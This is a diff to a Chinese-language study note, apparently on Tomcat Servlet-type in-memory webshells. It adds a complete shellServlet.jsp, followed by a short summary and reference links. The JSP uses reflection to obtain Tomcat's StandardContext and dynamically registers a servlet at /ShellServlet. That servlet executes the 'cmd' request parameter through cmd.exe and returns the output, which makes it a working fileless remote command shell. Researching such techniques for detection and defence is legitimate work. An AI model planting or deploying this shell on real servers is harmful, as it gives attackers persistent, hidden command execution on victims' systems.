@@ -220,3 +220,89 @@ addChild和设置映射
 
 ### shellServlet.jsp
 
+```jsp
+<%@ page import="java.io.IOException" %><%--  
+  Created by IntelliJ IDEA.  User: wum0nster  Date: 2023/3/19  Time: 15:25  To change this template use File | Settings | File Templates.--%>  
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
+<%@ page import="org.apache.catalina.core.StandardContext" %>  
+<%@ page import="java.lang.reflect.Field" %>  
+<%@ page import="org.apache.catalina.connector.Request" %>  
+<%@ page import="java.io.InputStream" %>  
+<%@ page import="java.util.Scanner" %>  
+<%@ page import="java.io.IOException" %>  
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
+<%@ page import="org.apache.catalina.Wrapper" %>  
+<%!  
+public class ShellServlet extends HttpServlet{  
+    @Override  
+    public void init() throws ServletException {  
+        super.init();  
+    }  
+  
+    @Override  
+    protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {  
+        if (httpServletRequest.getParameter("cmd") != null){  
+            InputStream in = null;  
+            try {  
+                in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",httpServletRequest.getParameter("cmd")}).getInputStream();  
+                Scanner s = new Scanner(in).useDelimiter("\\A");  
+                String out = s.hasNext()?s.next():"";  
+                Field requestF = httpServletRequest.getClass().getDeclaredField("request");  
+                requestF.setAccessible(true);  
+                Request request = (Request)requestF.get(httpServletRequest);  
+                request.getResponse().getWriter().write(out);  
+            }  
+            catch (IOException e) {}  
+            catch (NoSuchFieldException e) {}  
+            catch (IllegalAccessException e) {}  
+        }    }  
+    @Override  
+    public void destroy() {  
+        super.destroy();  
+    }  
+}  
+%>  
+  
+<%  
+    ServletContext servletContext = request.getServletContext();  
+    Field applicationContextField = servletContext.getClass().getDeclaredField("context");  
+    applicationContextField.setAccessible(true);  
+    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);  
+  
+    Field standardcontextField = applicationContext.getClass().getDeclaredField("context");  
+    standardcontextField.setAccessible(true);  
+    StandardContext standardContext = (StandardContext) standardcontextField.get(applicationContext);  
+  
+    Wrapper wrapper = standardContext.createWrapper();  
+    wrapper.setName("ShellServlet");  
+    wrapper.setServletClass(ShellServlet.class.getName());  
+    wrapper.setServlet(new ShellServlet());  
+  
+    standardContext.addChild(wrapper);  
+    standardContext.addServletMappingDecoded("/ShellServlet", "ShellServlet");  
+  
+%>  
+<html>  
+<head>  
+    <title>Title</title>  
+</head>  
+<body>  
+  
+</body>  
+</html>
+```
+
+
+## 总结
+
+事实上在前半截的调试和分析是很混乱的，不过也加深了认识，有得有失，两种调试方法
+- 从结尾看参数找需要设置的值
+- 从头开始看注册的过程
+
+事实上想要真正的理解内存马，需要去深刻的理解在tomcat中Host，Context，Wrapper的关系
+
+## 参考链接
+
+[Java内存马系列-05-Tomcat 之 Servlet 型内存马 | 芜风 (drun1baby.top)](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#toc-heading-6)
+
+https://www.bilibili.com/video/BV1E84y1w77R
